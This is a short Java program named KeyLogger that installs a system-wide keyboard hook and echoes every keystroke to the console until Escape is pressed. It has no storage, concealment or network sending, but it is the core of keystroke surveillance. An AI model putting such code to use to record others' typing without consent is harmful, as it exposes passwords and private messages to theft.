package keylogger;

import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;

import java.awt.*;
import java.awt.event.KeyEvent;

public class KeyLogger {

    private static boolean run = true;
    private static boolean capsLock;

    public static void main(String[] args) {
        capsLock = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);

        GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);
        keyboardHook.addKeyListener(new GlobalKeyAdapter() {
            @Override
            public void keyPressed(GlobalKeyEvent event) {
                switch (event.getVirtualKeyCode()){
                    case GlobalKeyEvent.VK_ESCAPE:
                        run = false;
                        return;
                    case GlobalKeyEvent.VK_CAPITAL:
                        capsLock = !capsLock;
                        break;
                    case GlobalKeyEvent.VK_BACK:
                        break;
                    case GlobalKeyEvent.VK_RETURN:
                        System.out.println();
                        break;
                }
                System.out.print(event.getKeyChar());
            }
        });

        try {
            while(run) Thread.sleep(128);
        } catch(InterruptedException ignored) {}
        finally { keyboardHook.shutdownHook(); }
    }
}